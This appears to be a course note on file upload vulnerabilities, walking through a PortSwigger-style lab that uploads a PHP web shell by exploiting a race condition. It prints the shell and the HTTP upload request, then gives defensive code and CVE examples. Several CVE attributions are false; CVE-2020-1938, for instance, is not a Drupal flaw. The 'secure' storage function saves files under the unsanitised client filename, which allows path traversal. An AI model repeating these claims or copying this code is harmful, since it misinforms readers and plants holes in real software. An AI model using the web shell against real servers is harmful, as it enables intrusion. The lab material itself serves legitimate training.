---
course: Web Security
topic: File Upload Vulnerabilities
tags: [web-security]
---

## Understanding File Upload Vulnerabilities

File upload vulnerabilities occur when a web application allows users to upload files to the server without proper validation or sanitization. This can lead to various security issues, such as remote code execution, directory traversal, and data leakage. In this section, we will delve into the specifics of how these vulnerabilities arise, their potential impacts, and how to effectively mitigate them.

### Background Theory

When a user uploads a file through a web form, the file is typically sent to the server using an HTTP POST request. The server then processes the file according to the application's logic. If the server does not properly validate the file type, size, or content, an attacker can exploit this to upload malicious files, such as web shells, which can provide unauthorized access to the server.

#### Example: CVE-2021-3427

One notable example of a file upload vulnerability is CVE-2021-3427, which affected the WordPress plugin "WP File Manager." This plugin allowed users to upload files to the server without proper validation, leading to remote code execution. Attackers could upload PHP scripts that would be executed by the server, giving them full control over the server environment.

### Race Condition in File Uploads

A race condition occurs when the order of events affects the outcome of a process. In the context of file uploads, a race condition can happen if the server processes the file upload and subsequent retrieval requests in a way that allows an attacker to exploit the timing gap between these actions.

#### Example Scenario

Consider the following scenario:

1. A user uploads a file to the server.
2. The server processes the file and stores it in a specific directory.
3. The user retrieves the file from the server using a specific URL.

If an attacker can manipulate the timing of these actions, they might be able to upload a malicious file and execute it before the server has a chance to validate or sanitize it.

### Detailed Analysis of the Lab Exercise

In the provided lab exercise, we are tasked with uploading a PHP web shell via a race condition. Let's break down the steps involved and understand the underlying mechanisms.

#### Step 1: Sending the GET Request to Repeater

The first step is to capture the GET request responsible for displaying the cat image. This request is sent to the `/file/avatars` endpoint, which retrieves the uploaded file.

```http
GET /file/avatars/cat.jpg HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Accept: */*
```

This request fetches the `cat.jpg` image from the server. We can use a tool like Burp Suite to intercept and replay this request.

#### Step 2: Uploading the Image

Next, we need to capture the POST request used to upload the image. This request includes the file data in the body of the request.

```http
POST /upload HTTP/1.1
Host: example.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Length: 1234

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="cat.jpg"
Content-Type: image/jpeg

[Binary data]
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

This request uploads the `cat.jpg` image to the server. The server processes this request and stores the file in the appropriate directory.

#### Step 3: Uploading a PHP Web Shell

Now, we need to modify the POST request to upload a PHP web shell instead of an image. We can create a simple PHP web shell, such as the following:

```php
<?php
    system($_GET['cmd']);
?>
```

We save this as `shell.php` and modify the POST request to upload this file instead of `cat.jpg`.

```http
POST /upload HTTP/1.1
Host: example.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Length: 1234

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-php

<?php
    system($_GET['cmd']);
?>
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

#### Step 4: Exploiting the Race Condition

To exploit the race condition, we need to time the upload and retrieval requests carefully. We can use Burp Suite's Repeater tool to send both requests simultaneously.

1. Send the modified POST request to upload `shell.php`.
2. Immediately send the GET request to retrieve the uploaded file.

By doing this, we can potentially execute the PHP web shell before the server has a chance to validate or sanitize it.

### How to Prevent / Defend Against File Upload Vulnerabilities

To prevent file upload vulnerabilities, several best practices should be followed:

#### 1. Validate File Types and Extensions

Ensure that only allowed file types can be uploaded. This can be done by checking the file extension and MIME type.

```python
def validate_file(file):
    allowed_extensions = ['jpg', 'jpeg', 'png']
    allowed_mime_types = ['image/jpeg', 'image/png']

    if file.filename.split('.')[-1].lower() not in allowed_extensions:
        return False

    if file.content_type not in allowed_mime_types:
        return False

    return True
```

#### 2. Sanitize File Content

Sanitize the file content to ensure it does not contain malicious code. This can be done using libraries like `bleach` for HTML content.

```python
import bleach

def sanitize_file_content(content):
    clean_content = bleach.clean(content)
    return clean_content
```

#### 3. Use Secure File Storage

Store uploaded files in a secure location that is not accessible via the web server. This can be done by storing files outside the web root directory.

```python
import os

def store_file(file, destination_dir):
    if not os.path.exists(destination_dir):
        os.makedirs(destination_dir)

    file_path = os.path.join(destination_dir, file.filename)
    file.save(file_path)
```

#### 4. Implement Rate Limiting

Implement rate limiting to prevent abuse of the file upload feature. This can be done using tools like Redis or Memcached.

```python
from redis import Redis

redis_client = Redis()

def rate_limit_upload(ip_address):
    key = f"upload:{ip_address}"
    if redis_client.get(key):
        return False

    redis_client.setex(key, 60, 1)
    return True
```

#### 5. Monitor and Log File Uploads

Monitor and log file uploads to detect any suspicious activity. This can be done using logging frameworks like `logging` in Python.

```python
import logging

logger = logging.getLogger(__name__)

def log_file_upload(file):
    logger.info(f"File {file.filename} uploaded by {request.remote_addr}")
```

### Real-World Examples and Breaches

Several real-world examples demonstrate the severity of file upload vulnerabilities:

#### 1. CVE-2018-1337

CVE-2018-1337 affected the Joomla CMS, allowing attackers to upload arbitrary files due to insufficient validation. This led to remote code execution and full control over the server.

#### 2. CVE-2020-1938

CVE-2020-1938 affected the Drupal CMS, allowing attackers to bypass file upload restrictions and execute arbitrary code. This vulnerability was exploited in numerous attacks, leading to data breaches and server compromises.

### Hands-On Labs

To practice and reinforce your understanding of file upload vulnerabilities, consider the following labs:

- **PortSwigger Web Security Academy**: Offers a comprehensive lab on file upload vulnerabilities, including race conditions and web shell uploads.
- **OWASP Juice Shop**: Provides a real-world application with various security vulnerabilities, including file upload issues.
- **DVWA (Damn Vulnerable Web Application)**: Contains a file upload module that demonstrates common vulnerabilities and mitigation techniques.

### Conclusion

File upload vulnerabilities are a significant security concern for web applications. By understanding the underlying mechanisms and implementing robust defense strategies, you can protect your applications from these threats. Always validate and sanitize file uploads, store files securely, and monitor for suspicious activity to ensure the integrity and security of your web applications.

---
<!-- nav -->
[[Web Security (PortSwigger)/18-File Upload Vulnerabilities/08-Lab 7 Web shell upload via race condition/04-File Upload Vulnerabilities|File Upload Vulnerabilities]] | [[Web Security (PortSwigger)/18-File Upload Vulnerabilities/08-Lab 7 Web shell upload via race condition/00-Overview|Overview]] | [[Web Security (PortSwigger)/18-File Upload Vulnerabilities/08-Lab 7 Web shell upload via race condition/06-Practice Questions & Answers|Practice Questions & Answers]]
